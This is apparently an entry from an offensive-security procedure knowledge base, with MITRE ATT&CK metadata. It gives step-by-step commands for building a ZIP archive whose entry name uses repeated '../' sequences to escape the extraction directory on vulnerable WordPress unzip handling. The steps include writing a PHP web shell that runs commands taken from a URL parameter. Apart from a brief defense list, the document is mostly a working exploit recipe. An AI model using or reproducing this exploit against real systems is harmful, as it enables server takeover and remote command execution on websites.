---
id: p2b3c4d5-e6f7-8901-bcde-f2345678901
tags:
  - path-traversal
  - zip
  - malware-creation
type: procedure
tools:
  - '[[tools/zip]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/zip-create-traversal]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:26:27.909Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Craft Malicious Zip with Path Traversal

## Summary

This procedure creates a malicious ZIP archive with path traversal payloads in entry filenames, allowing extraction to arbitrary directories like /tmp when processed by vulnerable unzip functions.

## Description

Using the 'zip' utility, construct a ZIP file where an entry's filename includes multiple '../' sequences to escape the target extraction directory. For example, target /tmp from a WordPress uploads folder by calculating path depth (e.g., 12 '../' for typical structures). Include a payload file such as a PHP shell. This is key for exploiting WordPress unzip_file. Expected outcome: ZIP that writes files outside intended paths on extraction.

## Requirements

1. Linux environment with 'zip' command-line tool
2. Write access to local filesystem for creating files
3. Knowledge of target server directory structure for path calculation

## Defense

Defensive measures and detection strategies:

- Scan uploaded ZIPs for suspicious filenames with '../' using antivirus or custom scripts
- Restrict ZIP uploads to authenticated users only
- Log all file extractions and monitor for anomalies in path usage

## Objectives

1. Generate ZIP with traversal-capable entry names
2. Embed payload for post-exploitation (e.g., PHP code)
3. Verify ZIP integrity without triggering extraction

## Instructions

### Step 1: Create Payload File

**Context**: Prepare the content to be written via traversal, such as a simple PHP shell.

Execute [[commands/create-payload-file]]:

```bash
echo '<?php system($_GET["cmd"]); ?>' > poc_file
```

> This creates poc_file with RCE capability.

### Step 2: Build ZIP with Traversal Path

**Context**: Use zip to add the payload with a filename that traverses to /tmp.

Execute [[commands/zip-create-traversal]]:

```bash
zip zip_poc.zip ../../../../../../../../../../tmp/poc_file
```

> Adjust '../' count based on extraction target (e.g., from /wp-content/uploads/). Expected: ZIP with entry '../../../../../../../../../../tmp/poc_file'.

### Step 3: Verify ZIP Contents

**Context**: List entries to confirm traversal without extracting.

```bash
unzip -l zip_poc.zip
```

> Output shows the malicious path in the archive.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Remote File Copy]]

### Sub-Techniques


## Commands Used

- [[commands/create-payload-file]]
- [[commands/zip-create-traversal]]

## Tools Used

- [[tools/zip]]

## Tags

- [[path-traversal]]
- [[zip-exploitation]]
- [[rce-payload]]
